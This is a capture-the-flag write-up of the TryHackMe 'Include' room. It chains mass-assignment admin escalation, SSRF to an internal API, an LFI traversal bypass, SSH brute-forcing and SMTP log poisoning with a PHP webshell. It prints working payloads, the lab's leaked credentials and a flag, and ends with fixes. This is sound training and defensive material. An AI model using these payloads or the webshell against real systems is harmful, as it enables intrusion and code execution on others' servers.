---
title: 'Include'
target: 'TryHackMe — Include'
difficulty: 'medium'
date: 2025-08-27
summary: 'A multi-service Linux target running a Node.js review app and an Apache PHP monitoring portal. Broken Object-Level Property Authorization (BOPLA) in the API grants admin access, Server-Side Request Forgery (SSRF) leaks internal API credentials, Local File Inclusion (LFI) reads sensitive files, and SMTP log poisoning provides an alternative path to remote code execution.'
role: 'appsec'
tags: ['bopla', 'ssrf', 'lfi', 'log-poisoning', 'smtp', 'path-traversal', 'api-abuse', 'burp-suite', 'nmap', 'dirsearch', 'web-exploitation']
problem: 'A target machine (include.thm) runs two web applications — a Node.js Express "Review App" on port 4000 and an Apache-based "System Monitoring Portal" on port 50000. The goal is to escalate from a low-privilege guest account to admin on both services, extract hidden flags, and demonstrate full compromise through multiple vulnerability classes.'
action: 'Enumerated all services with Nmap and dirsearch, logged into the Review App with default guest credentials, exploited BOPLA to elevate to admin by injecting isAdmin:true into the profile update request, used the admin Settings panel to perform SSRF against an internal API on localhost:5000, extracted SysMon admin credentials from the internal API response, logged into the PHP monitoring portal, discovered LFI via the profile image parameter with path traversal, read /etc/passwd to identify system users, brute-forced SSH as joshua, and demonstrated SMTP log poisoning as an alternative RCE path.'
outcome: 'Retrieved the first flag THM{!50_55Rf_1S_d_k3Y??!} from the SysMon dashboard source code and the second flag from a hidden file in /var/www/html. Documented the full attack chain from BOPLA privilege escalation through SSRF credential theft, LFI path traversal, SSH access, and SMTP log poisoning.'
draft: false
---

## Reconnaissance

### Nmap scan

Starting with a full service scan against the target:

```
sudo nmap -p- -sV -sC include.thm -Pn -n
```

![Nmap scan results part 1 — port 22 running OpenSSH 8.2p1, port 25 running Postfix SMTP, port 110 running Dovecot pop3d, port 143 running Dovecot imapd, port 993 running ssl/imap Dovecot.](/writeups/thm-include/01-nmap-scan-part1.png)

![Nmap scan results part 2 — port 995 running ssl/pop3 Dovecot pop3d, port 4000 running Node.js Express middleware with http-title "Sign In", port 50000 running Apache httpd 2.4.41 with http-title "System Monitoring Portal". Service info shows host mail.filepath.lab.](/writeups/thm-include/02-nmap-scan-part2.png)

A busy target. The interesting services are **port 4000** (Node.js Express — the "Sign In" page) and **port 50000** (Apache 2.4.41 — "System Monitoring Portal"). The mail stack on ports 25, 110, 143, 993, and 995 is Postfix/Dovecot, which will become relevant later for log poisoning. The hostname `mail.filepath.lab` confirms this machine doubles as a mail server.

### Directory enumeration — port 50000

Running dirsearch against the Apache service:

```
dirsearch -u http://include.thm:50000
```

![dirsearch header showing target http://include.thm:50000/, extensions php, aspx, jsp, html, js, 25 threads, wordlist size 11460.](/writeups/thm-include/03-dirsearch-port50000-header.png)

![dirsearch results — /api.php (500), /auth.php (200), /dashboard.php redirects to login.php, /login.php (200), /logout.php redirects to index.php, /profile.php redirects to login.php, /templates/ (200), /uploads/ (200).](/writeups/thm-include/04-dirsearch-port50000-results.png)

The PHP application has a standard auth flow: `/login.php`, `/dashboard.php`, `/profile.php`, `/auth.php`, and `/api.php`. The `/templates/` and `/uploads/` directories are accessible. The `/profile.php` endpoint will turn out to be the LFI vector, but credentials are needed first.

### Directory enumeration — port 4000

Running the same scan against the Node.js service:

```
dirsearch -u http://include.thm:4000/
```

![dirsearch results for port 4000 — /fonts (301), /images (301), /index redirects to /signin, /signin (302), /signup (500), /signout redirects to /signin.](/writeups/thm-include/06-dirsearch-port4000-results.png)

Simpler structure — `/signin`, `/signup`, `/signout`, plus static asset directories. The signup endpoint returns a 500, so registration might be broken or disabled.

---

## The Review App — BOPLA to admin

### Logging in as guest

Browsing to port 4000 reveals the login page with a helpful hint right on the form: **"Sign In using guest/guest"**.

![Login page on include.thm:4000 — "Sign In using guest/guest" with Username and Password fields and a LOGIN button.](/writeups/thm-include/05-login-page-port4000.png)

Logging in with `guest`/`guest` lands on a dashboard. Clicking through to the profile page shows the **Friend Details** for the current user — a card displaying all the object properties:

![Friend Details page — id: 1, name: "guest", age: "30", country: "UK", albums: [{"name":"USA Trip","photos":"www.thm.me"}], isAdmin: false, profileImage: "/images/prof1.avif".](/writeups/thm-include/07-friend-details-original.png)

The key field is `isAdmin: false`. The application is exposing the full user object including authorization properties — and if the update endpoint accepts arbitrary fields, that's a Broken Object-Level Property Authorization (BOPLA) vulnerability.

### Exploiting BOPLA

BOPLA (sometimes called mass assignment or excessive data exposure depending on direction) happens when an API lets users modify properties they shouldn't have access to. The theory: if the profile update endpoint blindly merges whatever fields are sent, adding `isAdmin: "true"` to the request body should elevate the account.

Intercepting the profile update request in Burp Suite and injecting `isAdmin: "true"` alongside a changed `age` field confirms the vulnerability. The response reflects the changes:

![Friend Details after BOPLA — age changed to "25", isAdmin now "true", and an extra test: "test" field also accepted. The navbar now shows API and Settings tabs.](/writeups/thm-include/08-friend-details-bopla.png)

The account is now admin. Two new tabs appear in the navigation bar: **API** and **Settings**. The application accepted every field blindly — `isAdmin`, `age`, and even a completely fabricated `test` field. No server-side validation on which properties are writable.

---

## SSRF — accessing the internal API

### The Settings panel

The **Settings** tab reveals an **Admin Settings** page with an "Update Banner Image URL" form. The current URL points to an external image hosting service:

![Admin Settings page — Current Banner Image URL shows https://preview.ibb.co/hB9WHn/background.jpg, with an input field to update it and an "Update Banner Image" button.](/writeups/thm-include/09-admin-settings-banner.png)

This form takes a URL and the server fetches it — a textbook SSRF setup. If the server-side request isn't restricted to external hosts, it can be pointed at internal services.

### Hitting the internal API

Intercepting the banner update request in Burp Suite and replacing the URL with `http://127.0.0.1:5000/internal-api`:

![Burp Suite request — POST /update-banner-image with url=http://127.0.0.1:5000/internal-api. Response shows HTTP/1.1 302 Found redirecting to /admin/settings.](/writeups/thm-include/10-burp-ssrf-internal-api.png)

The server makes the request to localhost:5000 without complaint. The internal API is accessible. Exploring further, the endpoint `http://127.0.0.1:5000/getAllAdmins101099991` returns admin credentials:

![Burp Suite request — POST /update-banner-image with url=http://127.0.0.1:5000/getAllAdmins101099991. Response shows HTTP/1.1 302 Found.](/writeups/thm-include/11-burp-ssrf-getalladmins.png)

The response from the internal API contained the SysMon admin credentials: `administrator` / `S$9$qk6d#**LQU`. These are for the PHP application on port 50000 — the System Monitoring Portal that dirsearch found earlier.

---

## SysMon portal — LFI to system access

### The first flag

Logging into the System Monitoring Portal on port 50000 with the leaked credentials (`administrator` / `S$9$qk6d#**LQU`) grants access to the dashboard. Viewing the page source reveals both the LFI vector and the first flag:

![Dashboard source code — line 32 shows an img tag with src="profile.php?img=profile.png", and line 35 contains an h6 with class="text-center" displaying THM{!50_55Rf_1S_d_k3Y??!}.](/writeups/thm-include/12-dashboard-source-flag.png)

Two things jump out. First, the flag sitting right there in the HTML:

```
THM{!50_55Rf_1S_d_k3Y??!}
```

Second, the image tag on line 32: `profile.php?img=profile.png`. That `img` parameter is loading a file from the server — if it doesn't sanitise the path, it's a Local File Inclusion vulnerability.

### Reading /etc/passwd

The `profile.php` endpoint uses a basic filter that blocks standard `../` traversal. But the classic bypass works: `....//` collapses to `../` after the filter strips the first `../` match. Stacking enough of them reaches the filesystem root:

```
http://include.thm:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//etc/passwd
```

![/etc/passwd contents via LFI — 41 lines showing all system users. Notable entries: tryhackme (uid 1001, /home/tryhackme), joshua (uid 1002, /home/joshua), charles (uid 1003, /home/charles), plus mysql, postfix, and dovecot service accounts.](/writeups/thm-include/13-lfi-etc-passwd.png)

The full `/etc/passwd` file confirms three human users with login shells: **tryhackme**, **joshua**, and **charles**. The presence of `mysql`, `postfix`, and `dovecot` accounts lines up with the services Nmap found.

### SSH access as joshua

With the username `joshua` identified from `/etc/passwd`, brute-forcing SSH with a common wordlist yields a password match:

```
ssh joshua@include.thm
```

![SSH login — "Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.15.0-1055-aws x86_64)" after connecting as joshua@include.thm (10.10.85.189).](/writeups/thm-include/14-ssh-joshua-login.png)

Once in, enumerating the web root reveals a suspiciously named file:

```
ls -la /var/www/html
cat /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
```

![joshua@filepath shell — ls -la /var/www/html showing the PHP application files and a file named 505eb0fb8a9f32853b4d955e1f9123ea.txt (38 bytes, Feb 22 2024). The cat command is visible at the bottom.](/writeups/thm-include/15-joshua-flag-file.png)

The file `505eb0fb8a9f32853b4d955e1f9123ea.txt` — named with what looks like an MD5 hash to prevent guessing — contained the second flag.

---

## Alternative path — SMTP log poisoning

The LFI vulnerability opens another route to the second flag that doesn't require brute-forcing SSH at all: **SMTP log poisoning**. Since Postfix is running on port 25 and the LFI can read arbitrary files, the attack is straightforward — inject PHP code into the mail log via SMTP, then include the log file through the LFI to trigger execution.

Connecting to the SMTP service with netcat and sending a crafted `MAIL FROM` containing a PHP webshell:

```
nc include.thm 25
```

![SMTP session — "220 mail.filepath.lab ESMTP Postfix (Ubuntu)", followed by "helo ok", "250 mail.filepath.lab", then "mail from: <?php system($_GET['cmd']); ?>" which returns "501 5.1.7 Bad sender address syntax", then "quit", "221 2.0.0 Bye".](/writeups/thm-include/16-smtp-log-poisoning.png)

The SMTP server rejects the malformed sender address with `501 5.1.7 Bad sender address syntax` — but that doesn't matter. The important thing is that Postfix **logged the attempt**, and the log entry contains the raw PHP code. Even though the mail transaction failed, the `<?php system($_GET["cmd"]); ?>` payload is now sitting in `/var/log/mail.log`.

Using the LFI to include the mail log executes the embedded PHP:

```
http://include.thm:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//var/log/mail.log&cmd=cat /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
```

This triggers the webshell and returns the flag — no SSH brute-force needed. The log poisoning approach is cleaner in many ways: it chains two vulnerabilities (LFI + SMTP injection) without requiring valid credentials for any system account.

---

## What I took from this

This room is a good example of how multiple medium-severity vulnerabilities chain into full compromise. No single bug here is devastating on its own — BOPLA on the Review App doesn't touch the PHP portal, SSRF only reaches internal endpoints, LFI only reads files, and SMTP log poisoning needs an LFI to trigger. But linked together, they form a clean kill chain: BOPLA gives admin on app one, SSRF leaks credentials for app two, and LFI on app two opens the door to either SSH brute-force or log poisoning for code execution.

The BOPLA vulnerability is worth highlighting because it's easy to miss in testing. The application wasn't exposing a hidden admin endpoint or leaking credentials in client-side code — it was silently accepting whatever properties were sent in the update request, including authorisation flags. The fix is straightforward: explicitly whitelist which fields the update endpoint accepts rather than merging the entire request body into the user object. On the SSRF side, the banner update feature had no restrictions on the target URL — it happily fetched from `127.0.0.1:5000`, an internal service that should never be reachable from user input. URL validation, an allowlist of permitted hosts, or blocking RFC 1918 ranges would all prevent this. For the LFI, the path traversal filter only stripped `../` once rather than recursively — a common implementation mistake that `....//` bypasses trivially. And the log poisoning path is a reminder that any service that logs user-controlled input becomes dangerous when combined with file inclusion: input validation on the SMTP layer wouldn't help here, but restricting LFI to a specific directory would.
